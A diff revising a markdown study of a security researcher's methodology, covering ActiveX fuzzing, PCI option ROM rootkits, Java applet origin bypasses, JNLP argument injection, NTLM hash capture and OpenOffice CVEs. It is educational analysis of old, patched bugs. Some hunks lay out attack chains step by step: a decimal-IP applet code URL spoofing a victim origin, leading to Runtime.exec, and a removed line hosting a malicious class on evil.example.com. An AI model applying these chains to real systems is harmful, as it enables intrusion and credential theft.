@@ -82,8 +82,9 @@ Most ActiveX fuzzing tools (COMRaider and contemporaries) exercised COM dispatch
 omitted `IPersistPropertyBag` / `IPropertyBag`. Any control implementing these for property
 persistence was systematically missed. The fix was straightforward: enumerate all implemented
 interfaces via `IUnknown::QueryInterface` before deciding what to fuzz. The Yahoo Messenger heap
-overflow (`ymmapi.ymailattach.1`, `TextETACalculating` property) was found this way — a signed,
-widely distributed component, exploitable via a property the fuzzer never reached.
+overflow (`ymmapi.ymailattach.1`, `TextETACalculating` property, reported by iDefense) is the
+worked example — a signed, widely distributed component, exploitable via a property the fuzzer
+never reached.
 
 Generalized: **know the full interface surface of your target, not just the most obvious
 attack surface.** Do not rely on existing tool coverage as ground truth for what exists.
@@ -200,8 +201,8 @@ flash utility. Suitable for targeted persistent access, not mass exploitation.
 
 From "Implementing and Detecting a PCI Rootkit" (Black Hat DC 2007):
 
-Intel SecureFlash and Phoenix TrustedCore implement TPM-backed verification of BIOS images,
-preventing unsigned BIOS modifications. The response: PCI option ROMs.
+Intel SecureFlash and Phoenix TrustedCore motherboards prevent the system BIOS from being
+overwritten with unsigned updates. The response: PCI option ROMs.
 
 PCI expansion cards (network adapters, video cards, SCSI controllers) contain flashable option
 ROMs that execute at POST, before the OS boots and before any TPM measurement. On systems without
@@ -276,14 +277,17 @@ applied to the native code beneath the managed runtime.
 The core of Heasman's Java SOP research (BH 2008 / blog series):
 
 Java's URL class resolves the authority component (hostname:port) to determine the origin of
-loaded code. The bug: applet code URLs containing a period character triggered internal
-canonicalization that converted slashes to dots, causing the authority reported to the security
-manager to differ from the host the class was actually loaded from.
+loaded code. The bug: in the `URL(URL context, String spec)` constructor, if the authority component is
+present in the spec then the spec is treated as absolute, so `code="http://baz/foo"` with
+`codebase="http://bar"` loads `foo` from `baz` while the reported codebase is `bar`. If the
+`code` value contains a period, an internal canonicalisation routine converts the slashes to
+dots and the attack fails; the workaround is the decimal representation of an IP address
+(e.g. `http://2130706433/foo`).
 
 Exploitation chain:
-1. Host malicious class at `http://evil.example.com/foo`
-2. Specify in applet tag: `code="http://evil.example.com/foo"` with `codebase="http://victim.com"`
-3. JVM loads class from `evil.example.com` but reports origin as `victim.com`
+1. Host malicious class at `http://2130706433/foo` (decimal IP, no periods)
+2. Specify in applet tag: `code="http://2130706433/foo"` with `codebase="http://victim.com"`
+3. JVM loads class from `2130706433` but reports origin as `victim.com`
 4. Applet is granted `victim.com` permissions and can make network requests to `victim.com`
 
 **Drive letter discovery** (escalation to full code execution via extensions directory):
@@ -295,14 +299,13 @@ To exploit:
 3. With AllPermission: `Runtime.getRuntime().exec()` or `System.loadLibrary()` → full OS access
 
 **Workaround for class name mismatch:** Compile class with any name, then hex-edit the class
-file's `this_class` constant pool entry to match the URL path string. The JVM's class loader
-resolves by constant pool reference, not file name.
+file's `this_class` constant pool entry to match the URL path string.
 
 ### JNLP argument injection via property name escaping (Sun Alert 233323)
 
 Java Web Start processes JNLP property tags and passes them as JVM arguments. By inserting
-`/` characters into property names, an attacker could escape the property name field and inject
-arbitrary JVM arguments — including `-classpath` pointing to a malicious JAR. Demonstrates that
+an additional `/` that consumes the escape character, an attacker could slip an unescaped double
+quote through and inject arbitrary JVM arguments — including `-jar` pointing to a remote JAR. Demonstrates that
 argument injection in configuration-file parsers follows the same pattern as SQL injection and
 command injection.
 
@@ -311,7 +314,8 @@ command injection.
 Unsigned files appended to a signed JAR do not trigger verification exceptions in `JarFile`. The
 `jarsigner` tool's validation mode was separately fooled by files prefixed `META-INF/SIG-`. The
 mismatch between the two verification paths allowed appending a malicious `java.policy` file to a
-signed JAR, granting the attacker-controlled policy file priority in the security manager.
+signed JAR, which the vulnerable code drops into the user's home directory, loosening the
+sandbox for applets and Web Start applications.
 
 General principle: **integrity verification has multiple implementation layers that may not
 check the same thing.** When two components both claim to verify the same artifact, probe whether
@@ -321,14 +325,14 @@ they verify the same set of bytes in the same way.
 
 An unsigned applet can:
 1. Bind an HTTP server on `localhost`
-2. Serve content tagged as `file://` protocol (Local Intranet zone)
+2. Get the applet loaded via the `file://` protocol handler (a fixed-name cached file) so it
+   appears to come from localhost (Local Intranet zone)
 3. Trigger NTLM authentication challenge from the browser
 4. Capture the NTLM hash
 5. Offline-crack or relay the hash
 
 This works because Windows classifies localhost as the Local Intranet zone, which has different
-security policy than the Internet zone. The applet never touches the filesystem — it constructs
-the authentication exchange entirely in-process.
+security policy than the Internet zone.
 
 ---
 
@@ -378,17 +382,15 @@ intended to face the internet routinely end up doing so when wrapped in higher-l
 
 ### OpenOffice: multiple native-code vulnerabilities in a document suite
 
-Four CVEs from Heasman's NGS advisory work against OpenOffice.org 2.x:
+Three CVEs from Heasman's NGS advisory work against OpenOffice.org 2.x:
 
-- **CVE-2006-5870**: Heap overflows in WMF/EMF metafile handling. `EMR_POLYPOLYGON` and
-  `META_ESCAPE` records: a 32-bit length value is cast to 16-bit for the allocation calculation
-  but the 32-bit value is used for the subsequent fill loop. Classic integer truncation → heap
-  overflow.
+- **CVE-2006-5870**: Heap overflows in WMF/EMF metafile handling. `EMR_POLYPOLYGON`
+  records: `nGesPoints * sizeof(Point)` wraps for large point counts; `META_ESCAPE` records: a
+  32-bit string length is cast to `sal_uInt16` for the allocation, so lengths above 0xFFFF
+  overflow the heap. Classic integer wrap / truncation → heap overflow.
 - **CVE-2007-0238**: Stack-based buffer overflow in StarCalc (spreadsheet) parser.
-- **CVE-2007-0239**: Input validation failure in hyperlink metacharacter handling — clicking a
-  malicious link executes attacker-specified commands.
-- **CVE-2007-0245**: Heap buffer overflow in RTF parser: `prdata` tag where the first size token
-  is smaller than the second size token that drives the copy loop.
+- **CVE-2007-0245**: Heap buffer overflow in RTF parser: crafted `prtdata` tag with a length
+  parameter inconsistency.
 
 **Pattern:** Office/document suite native parsers are written in C/C++ for performance and
 handle complex binary format specifications. They are rarely audited with the same rigour as
@@ -407,7 +409,7 @@ consistent with Heasman's known research area.)
 ### The Windows kernel attack surface taxonomy
 
 **Stack overflows in kernel-mode code:**
-Kernel stacks are much smaller than user-mode stacks (typically 12–16KB on 32-bit Windows). The
+Kernel stacks are much smaller than user-mode stacks (12KB on 32-bit Windows). The
 GS compiler flag (`/GS`) places a stack cookie before the return address — but the attacker can
 overwrite enough data to control execution before the cookie check fires (e.g., by overwriting a
 local function pointer called before function return). Kernel heap overflows follow similar
@@ -466,7 +468,7 @@ Database platform matters for impact:
 
 ### The fuzzing approach to web applications
 
-From "Web Application (In)Security" (Black Hat training, 2010/2011) and Stanford lecture:
+From "Web Application (In)Security" (Black Hat training, 2010) and Stanford lecture:
 
 Web application fuzzing targets:
 - Input parameters (GET, POST, cookies, HTTP headers, JSON/XML body)
@@ -475,10 +477,8 @@ Web application fuzzing targets:
 - NoSQL query injection (MongoDB operator injection, CouchDB view injection)
 - Server-Side JavaScript injection (Node.js `eval`, template injection)
 
-2011 additions to the Black Hat training reflected the expanding surface: Ruby on Rails
-parameter handling vulnerabilities (mass assignment, YAML deserialization), Flex AMF
-deserialization, HTML5 cross-origin messaging (`postMessage` origin validation failures), NoSQL
-injection patterns.
+The 2010 update to the Black Hat training reflected the expanding surface: Ruby on Rails, Flex
+Remoting, Silverlight WCF, Java Server Faces, HTML5 and NoSQL.
 
 ---
 
@@ -495,15 +495,14 @@ From BSides Knoxville — "Doing More in AppSec by Doing Less":
 Treating every finding from a penetration test or bug bounty as an independent ticket to be
 remediated one by one does not scale. The correct model:
 
-1. **Collect true positives** from penetration tests, bug bounty, SAST/DAST
+1. **Collect true positives** from penetration tests, bug bounty, ad hoc testing
 2. **Determine root cause** in collaboration with engineering (not just symptoms)
 3. **Abstract to an anti-pattern** — what general coding pattern produced this class of flaw?
 4. **Prioritize by prevalence** — how many instances of this anti-pattern exist across the
    codebase?
-5. **Implement a countermeasure that eliminates the class** — fix the anti-pattern, add a
-   framework-level control, add a linting rule, add a unit test fixture
-6. **Verify the class is gone** — re-scan, re-test; do not close until the root cause is
-   addressed structurally
+5. **Fix**
+6. **Future-proof with countermeasures** — eliminate the class forever (framework-level
+   control, linting rule, unit test fixture)
 
 "If everything is a priority, nothing is a priority." AppSec programs that attempt to remediate
 every finding in parallel achieve low throughput on everything. Programs that identify the
@@ -528,11 +527,8 @@ before deploying it to production.
 
 ### Vulnerability classification and triage discipline
 
-From the JRE CVE-2018-2811 research (discovered at DocuSign):
-
-A weak ACL on the `ProgramData\Oracle\Java` directory allowed a low-privileged local user to
-plant a `jvm.cfg` file pointing to a malicious `jvm.dll`. Result: any process that loaded the
-JRE (including elevated processes) loaded the attacker's DLL.
+From CVE-2018-2811, a local vulnerability in the Install subcomponent of Oracle Java SE (8u162
+and 10) affecting the installation process on client deployments of Java.
 
 This class of vulnerability — **DLL hijacking / search order / configuration file injection via
 weak ACL** — is systematically present in software that:
@@ -548,8 +544,7 @@ exploited by a local attacker who has compromised any service account?
 
 From the MS06-003 advisory handling:
 
-NGS withheld full technical details for three months after the Microsoft patch (published January
-2006 patch, NGS full advisory April 2006). The principle: coordinated disclosure with a fixed
+The principle: coordinated disclosure with a fixed
 deadline. The attacker window opens at patch release (patch diffing); the defender's window is
 the same period. Extended technical publication after the patch gives defenders time to deploy
 while attackers race to exploit before deployment is complete.
@@ -615,11 +610,11 @@ The correct workflow:
 | MSI analysis | Orca (Windows SDK) | SQL query of MSI tables; inspect CustomAction, LockPermissions, ServiceInstall, File tables |
 | JRE debugging | JSwat | Breakpoint-based analysis of JVM internals; essential for authority component research |
 | Kernel debugging | WinDbg + kernel dump analysis | IOCTL handler fuzzing + crash analysis |
-| AML analysis | ACPI CA (Intel ACPI Component Architecture) | Decompile AML → ASL; recompile and flash modified BIOS |
+| AML analysis | Intel IASL tools | Decompile AML → ASL; recompile and flash modified BIOS |
 | Firmware extraction | Physical BIOS flash read + `strings`/hex analysis | Foundation for ACPI and option ROM research |
 | Exploit development | Heap spray, CVT read primitive, function pointer overwrite | JRE TrueType exploitation chain |
-| NTLM capture | Unsigned Java applet + localhost HTTP server | No disk access required; works via Local Intranet zone trust |
-| Coordinated disclosure | 90-day standard (Google Project Zero codified this after NGS era) | NGS practice: withhold technical details until patch is deployed |
+| NTLM capture | Unsigned Java applet + localhost HTTP server | Works via Local Intranet zone trust |
+| Coordinated disclosure | 90-day standard (Google Project Zero codified this after NGS era) | |
 
 ---
 
@@ -666,15 +661,14 @@ LLM-generated findings rises. Four currency notes:
 **AI-assisted code review and the "false sense of security" failure mode.** Multiple
 peer-reviewed studies from 2024–2025 document that LLM-generated code contains substantially
 more vulnerabilities than human-written code (the Veracode 2025 GenAI Code Security Report
-reports a ~2.74× factor, with ~45% of AI-generated samples carrying OWASP Top 10 issues; a
+reports ~45% of AI-generated samples carrying OWASP Top 10 issues; a
 GitHub Copilot security analysis found ~40% of generated programs contained vulnerabilities)
 ([CSA — Understanding Security Risks in AI-Generated Code](https://cloudsecurityalliance.org/blog/2025/07/09/understanding-security-risks-in-ai-generated-code),
 [SoftwareSeni summary](https://www.softwareseni.com/ai-generated-code-security-risks-why-vulnerabilities-increase-2-74x-and-how-to-prevent-them/)).
 Iterative AI code generation degrades further with each prompt cycle — one IEEE-ISTAS 2025
 paper documents a 37.6% increase in critical vulnerabilities after five iterations
 ([arXiv 2506.11022](https://arxiv.org/html/2506.11022v2)). The corresponding failure mode in
-user perception is well-documented: 81.9% of developers trust LLM-generated code to some
-degree, and participants using AI assistants rate their insecure solutions as secure. This is
+user perception is well-documented: participants using AI assistants rate their insecure solutions as secure. This is
 the AppSec inverse of Heasman's first-principles posture from Section 1 — pattern-matching
 against trained distributions, not reasoning from root cause. The deepening implication:
 **candidate-point auditing methodology is now load-bearing not just for human-written code but
@@ -764,7 +758,7 @@ has produced two notable in-the-wild artifacts since the doc was authored:
   persistence; disables BitLocker, HVCI, Windows Defender ([ESET — BlackLotus UEFI bootkit:
   Myth confirmed](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/),
   [Binarly — The Untold Story of the BlackLotus UEFI Bootkit](https://www.binarly.io/blog/the-untold-story-of-the-blacklotus-uefi-bootkit)).
-- **CosmicStrand** (Kaspersky GReAT, July 2022; ongoing analysis through 2024): UEFI firmware
+- **CosmicStrand** (Kaspersky GReAT, July 2022): UEFI firmware
   rootkit attributed to a Chinese-speaking threat actor, found in Gigabyte and ASUS H81
   chipset motherboard firmware images. Victims in China, Vietnam, Iran, Russia — narrowly
   targeted, no organizational pattern ([Kaspersky Securelist — CosmicStrand](https://securelist.com/cosmicstrand-uefi-firmware-rootkit/106973/)).
@@ -816,7 +810,7 @@ first-principles root cause analysis, full-stack scope, interface completeness, 
 thinking. Heasman's 2024 BSides talk reinforces — does not retreat from — the
 class-elimination-over-instance-fixing framing. The CVE catalog from 2005–2010 (CVE-2005-0227
 PostgreSQL `LOAD`, MS06-003 Exchange TNEF, the OpenOffice metafile / RTF / hyperlink chain,
-the JRE TrueType + URL-authority + JNLP-argument trio, the JRE-2018 DLL hijack at DocuSign)
+the JRE TrueType + URL-authority + JNLP-argument trio)
 still demonstrates every methodological commitment the doc canonizes. Section 12 below is the
 unchanged summary of what defines staff-level adversarial AppSec work.
 
